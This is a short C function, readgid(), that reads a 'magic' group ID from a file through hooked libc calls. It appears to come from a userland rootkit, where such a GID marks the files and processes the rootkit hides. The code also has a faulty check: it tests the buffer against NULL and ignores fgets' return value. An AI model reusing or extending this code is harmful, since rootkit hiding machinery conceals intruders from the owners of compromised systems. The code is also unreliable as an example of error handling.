gid_t readgid(void){
#ifdef READ_GID_FROM_FILE
    FILE *fp;
    hook(CFOPEN);

    fp = call(CFOPEN, GID_PATH, "r");
    if(fp == NULL){
        return MAGIC_GID;
    }

    char gidbuf[12];
    fgets(gidbuf, sizeof(gidbuf), fp);
    if(gidbuf == NULL){
        fclose(fp);
        return MAGIC_GID;
    }
    fclose(fp);

    gid_t magicgid = atoi(gidbuf);
    if(!magicgid) return MAGIC_GID;
    return magicgid;
#else
    return MAGIC_GID;
#endif
}